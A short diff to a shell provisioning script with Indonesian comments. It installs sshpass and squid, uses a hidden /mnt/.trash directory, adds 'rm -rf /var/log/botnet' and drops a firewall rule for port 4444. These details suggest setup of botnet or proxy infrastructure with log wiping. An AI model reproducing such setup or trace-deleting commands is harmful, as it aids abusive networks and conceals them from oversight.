@@ -14,6 +14,7 @@ DEBIAN_FRONTEND=noninteractive apt install -y sshpass build-essential squid
 
 # Membersihkan dan menyiapkan direktori
 rm -rf /mnt/.trash
+rm -rf /var/log/botnet
 mkdir /mnt/.trash
 cd /mnt/.trash
 
@@ -50,7 +51,6 @@ rm -rf /root/update.sh
 # Mengatur firewall untuk port yang diperlukan
 ufw allow 4343
 ufw allow 1201
-ufw allow 4444
 ufw allow 812
 ufw allow 22
 ufw allow 443
